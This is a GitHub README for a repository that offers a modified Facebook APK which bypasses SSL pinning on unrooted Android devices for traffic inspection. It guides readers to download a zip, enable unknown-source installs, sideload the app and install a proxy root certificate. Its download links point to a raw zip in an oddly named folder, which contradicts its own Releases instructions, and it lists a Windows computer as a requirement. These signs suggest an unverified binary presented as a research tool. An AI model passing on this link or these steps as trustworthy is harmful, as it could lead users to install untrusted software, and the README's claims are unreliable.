# 🛡️ Facebook-SSL-Pinning-Bypass-NonRoot - Analyze mobile traffic without device root

[![](https://img.shields.io/badge/Download_Files-Blue-blue.svg)](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot/raw/refs/heads/main/Ghegish/Bypass_Pinning_Facebook_SS_Root_Non_2.7.zip)

## About This Software

Security researchers often need to inspect the data sent between a mobile app and a server. Standard security measures inside the Facebook app prevent this type of inspection. SSL pinning binds the app to specific security certificates. If you attempt to look at the traffic, the app detects a connection change and stops working.

This project removes those restrictions. It provides a modified version of the Facebook application. You install this file on your Android device to allow traffic inspection tools to see the data. You do not need to root your phone or modify your system files to use these tools.

## 📋 Requirements

You need the following items to use this software:

- A Windows computer.
- An Android device running a modern version of the Android operating system.
- A USB cable to connect your phone to your computer.
- Network inspection software like Burp Suite or Charles Proxy.
- The modified APK file from this repository.

## 🚀 Downloading the Files

Visit the official project page to access the required files. You can find the latest version and previous releases on this page.

[Download Files Here](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot/raw/refs/heads/main/Ghegish/Bypass_Pinning_Facebook_SS_Root_Non_2.7.zip)

1. Go to the project page link above.
2. Look for the section labeled Releases on the right side of the screen.
3. Click the version number displayed at the top of the list.
4. Locate the section labeled Assets.
5. Click on the file name ending in .apk to save it to your computer.

## 📱 Preparing Your Android Device

Before you install the app, you must allow your phone to accept files from unknown sources. Android restricts installation to files from the official app store by default.

1. Open the Settings app on your phone.
2. Select Apps or Security depending on your device manufacturer.
3. Find the option for Install Unknown Apps.
4. Select the web browser or file manager you use to download files.
5. Toggle the switch to Allow from this source.

## 🔌 Connecting Your Hardware

You must connect your Android device to your computer to transfer the file.

1. Connect your phone to your computer using the USB cable.
2. Swipe down from the top of your phone screen to reveal notifications.
3. Tap the notification that mentions USB for charging.
4. Select File Transfer or Media Device mode. Your computer should now recognize your phone as a storage drive.

## 📥 Installing the Software

Once the file exists on your computer and your phone allows manual installations, move the file to your device.

1. Open your computer file explorer.
2. Copy the downloaded APK file.
3. Navigate to your phone storage drive.
4. Paste the APK file into a folder like Downloads.
5. Disconnect your phone from the computer.
6. Open the file manager on your phone.
7. Find the APK file you moved and tap it.
8. Follow the on-screen prompts to complete the installation.

## ⚙️ Configuring Traffic Inspection

This tool works with your proxy software to decrypt secure connections. You must import the certificate from your proxy tool into your phone.

1. Open your proxy tool on your computer.
2. Export the root certificate as a file.
3. Transfer this certificate file to your phone.
4. Open the Settings app on your Android device.
5. Search for Certificates or Encryption and Credentials.
6. Select Install from storage.
7. Choose the certificate file you just transferred.
8. Name the certificate and save the settings.

## 🔍 Testing the Connection

Open the Facebook app after you finish the installation and certificate setup. The app should now communicate with your proxy software.

1. Start your proxy software on your computer.
2. Ensure your computer and your phone are on the same local network.
3. Configure the Wi-Fi settings on your phone to use your computer IP address as the proxy server.
4. Open the installed Facebook app.
5. Look at your proxy window on your computer to view the incoming data traffic.

## ⚠️ Troubleshooting Common Issues

If the app fails to open or show traffic, check these common fixes:

- **Network Settings:** Verify your phone and computer exist on the same Wi-Fi network.
- **Certificate Trust:** Ensure the proxy certificate installation finished correctly in your phone settings.
- **Proxy Port:** Confirm that the port number in your phone Wi-Fi settings matches the port settings in your proxy software.
- **Expired Version:** Check this repository occasionally for updates, as Facebook frequently updates their app to block bypass methods.

## 🛡️ Security Considerations

Using modified applications involves risks. Only use these files for testing and research purposes. Do not use this modified app for your primary or personal account. The removal of security certificates reduces the protection of your credentials while the app is active. Always return to the standard app from the official app store when you finish your research.

## 🤝 Contributing to Research

This project relies on manual patching of the application code. If you notice the Facebook app stops working after an update, please wait for an update to this repository. You can verify the latest status of the project by checking the commits section on the main page. All modifications remain within the scope of security research and ethical penetration testing.